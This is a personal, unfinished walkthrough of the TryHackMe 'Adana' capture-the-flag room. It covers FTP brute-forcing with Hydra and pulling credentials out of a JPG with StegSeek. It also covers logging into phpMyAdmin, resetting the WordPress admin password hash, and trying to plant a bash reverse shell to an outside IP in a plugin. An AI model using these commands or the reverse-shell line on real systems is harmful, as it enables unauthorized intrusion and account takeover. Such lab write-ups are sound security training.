Adana
-----
Link: https://tryhackme.com/room/adana

Description
```
﻿Hello there
We will tend to think differently in this room.
In fact, we will understand that what we see is not what we think, and if you go beyond the purpose, you will disappear in the room, fall into a rabbit hole.﻿
```

When trying to navigate to the wp-admin page in firefox we are redirected to
this page: http://adana.thm/wp-login.php?redirect_to=http%3A%2F%2F10.10.32.11%2Fwp-admin%2F&reauth=1

and firefox cant find the site. Lets add adana.thm to the hosts file.

That works better.

If we go to http://adana.thm/announcements/, we can see two files:
[IMG]	austrailian-bulldog-ant.jpg	2021-01-11 11:51 	58K
[TXT]	wordlist.txt	2021-01-11 13:48 	394K

Let's download them and see if we find anything interesting.
wordlists.txt looks like a list of possible passwords.
We could try to hydra our way into the FTP server, although we don't have any
username. We could guess that it is "adana".

No dice.
```
$ hydra -l adana -P website/wordlist.txt adana.thm ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-21 18:42:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50000 login tries (l:1/p:50000), ~3125 tries per task
[DATA] attacking ftp://adana.thm:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 18:42:13
```

Let's try if we can do some steganography on the JPG-file we downloaded.
For this we can use stegseek:
```
$ stegseek austrailian-bulldog-ant.jpg ./wordlist.txt extracted_stegseek
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "extracted_stegseek".
```

Looks like we found something:
```
$ cat extracted_stegseek
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
```

Looks like a base64-encoded string, what do we get if we decode it?
```
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

Now we can login via ftp:
```
$ lftp adana.thm -u hakanftp
Password:
lftp hakanftp@adana.thm:~>
```

By the looks of the files in the directory, it looks like the wordpress-site.
However, if I try to upload a file to it, for example test.php, it 404:s.

So I don't think this is the website that is displayed.

The wp-settings.php file looks a bit odd:
```
lftp hakanftp@adana.thm:/> ls
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001           13 Aug 21 19:09 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rwxrwxrwx    1 1001     1001           62 Aug 21 19:06 test.php
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
```

I would compare it to a known good wordpress install, but I don't have one
readily available and don't have the energy to install one. It looks like it is
owned by root.

## Down the rabbit hole
It contains defines of DB_USER and DB_PASSWORD which can be used to login to
http://adana.thm/phpmyadmin:
```
/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

```

It feels almost like too easy to be true, and reading the description of the room
it feels eerily suspicious.

Looking around the phpmyadmin-page, we find two databases. phpmyadmin and
phpmyadmin1. In the wp_posts table we can find the post on adana.thm:

phpmyadmin:
```
<!-- wp:paragraph -->
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>
<!-- /wp:paragraph -->
```

phpmyadmin1:
```
<!-- wp:paragraph -->
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing! HAKANBEY</p>
<!-- /wp:paragraph -->
```
I wonder if HAKANBEY can be a clue.

When I changed the text of the first entry in phpmyadmin/wp_posts the text on
adana.thm changes. Lets see if we can get a reverse shell by inserting php-code
somewhere.

Trying to embed php-code into posts or comments doesn't work. The ideal would
be if we could get access to the admin page somehow.

In the phpmyadmin/wp_users, we find an interesting line:
```
1 	hakanbey01 	$P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/ 	hakanbey01 	hakanbey01@thm.com 	http://asd.thm 	2021-01-10 23:07:29 		0 	hakanbey01
```
The corresponding line in phpmyadmin1/wp_users:
```
1 	hakanbey01 	$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh. 	hakanbey01 	hakanbey01@thm.com 	http://asd.thm 	2021-01-10 23:07:29 		0 	hakanbey01
```

I wonder where http://asd.thm leads us? We'll add it to /etc/hosts and see.
It leads to the exact same page. It could be that I don't quite understand
how vhosts work.

We can now simply change the password using phpmyadmin, so lets generate a
hash for the password "password", so we can log in to wordpress with the following
credentials.
hakanbey01:password (hash: $P$BUxwQ9E6ZkxqCIcCmzPwTtRktTl03u1)

It seems that we can access the admin interface. Here we can see that there are
two plugins installed. "Hello Dolly", and "Akismet Anti-spam".

Let's see if we can use Dolly to get a reverse shell. By using the plugin editor
we can add the following line to the Dolly plugin:
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.21.85/4444 0>&1'");
```

Although, our plan seems to be foiled by file permissions:
```
 You need to make this file writable before you can save your changes. See Changing File Permissions for more information.
```

We are able to use lftp to alter the permissions:
```
lftp hakanftp@adana.thm:/wp-content/plugins> chmod 777 hello.php
lftp hakanftp@adana.thm:/wp-content/plugins> ls
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 akismet
-rwxrwxrwx    1 1001     1001         2578 Mar 18  2019 hello.php
-rw-r--r--    1 1001     1001           28 Jun 05  2014 index.php
```
But this doesn't help, since I don't think the files we can access through the
ftp are the ones we can access through Firefox.

There is a way to get a reverse shell by replacing the 404.php code with a
reverse shell, but those files are not writeable either.

I'm starting to suspect this is the rabbit hole referenced in the room
description.

## Back out of the rabbit hole?
So let's go back a few steps. I downloaded the JPG-file and the wordlist.txt
using a webbrowser. I should look and see if they are the same as the ones
accessible from the FTP server.

So lets repeat the steps from above.

Nope, they are the same.

It's getting late, let's table this for another day.
